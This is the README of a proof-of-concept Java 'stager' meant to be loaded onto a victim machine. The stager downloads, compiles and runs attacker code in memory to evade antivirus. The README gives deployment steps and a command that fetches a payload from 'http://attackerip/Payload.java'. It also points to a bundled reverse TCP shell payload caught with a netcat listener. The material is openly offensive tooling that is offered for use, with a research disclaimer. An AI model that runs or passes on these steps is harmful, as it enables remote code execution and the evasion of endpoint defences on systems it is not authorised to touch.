# java-stager
A PoC Java Stager which can download, compile, and execute a Java file in memory.

This is for research purposes only, do not use this where you are unauthorised to do so.

# What is this?

This is based on the work of James Williams from his talk "Next Gen AV vs My Shitty Code" available here:

https://www.youtube.com/watch?v=247m2dwLlO4&feature=youtu.be

The key parts of the talk for me are:

* Load a Stager onto victim (touches disk, but is a benign binary)
* Stager downloads raw code over HTTP (which stays in memory)
* Stager compiles raw code (also in memory)
* Stager then executes compiled code (also in memory)

His example is in .net, but in the talk he suggested that Java would be capable of the same techniques. I have implemented a raw PoC which I think matches the above techniques.

# Working with it

* Clone down the entire repository.
* Open it in an IDE which can use maven (such as NetBeans)
* The Stager, and the example payload are available in the "/src/main/java" folder.
* Alter the Stager as you would like and compile the project. I was using "clean/build" in the default profile.

The output in NetBeans Included a line like this:

`Building jar: C:\Users\cornerpirate\Documents\NetBeansProjects\java-stager\target\JavaStager-0.1-initial.jar`

To work on your victim you must upload the "JavaStager*.jar" file and the "lib" folder containing Janino from the "target" folder.

The following command will execute the stager:

`java -jar JavaStager-0.1-initial.jar`

You will be prompted with the usage as shown:

`Proper Usage is: java -jar JavaStager-0.1-initial.jar <url>`

The "url" is the only parameter that is passed to Stager. An example usage would be:

`java -jar JavaStager-0.1-initial.jar http://attackerip/Payload.java`

Your payload must be in a file called "Payload.java" and your exploit code must be in a static method called "Run". The following shows the template if you want to write your own:

```
public class Payload {
   public static void Run() {
      // Your code here
   }
}
```

I have provided an example Reverse TCP payload in the file "TCPReverseShell.java". To prevent name clashes this is not called "Payload.java" and the class name is wrong. 
The header comment in "TCPReverseShell.java" explains how to modify it to work.

You will need to host your "Payload.java" file on an HTTP server. You can use Apache if you want or simple HTTP/HTTPS services in Python2 and Python3 as per my blog:

https://cornerpirate.com/2016/12/16/simple-http-or-https-servers/

The attacker will need to start a netcat listener to catch the connection back using the standard `nc -lvp 8044` technique.

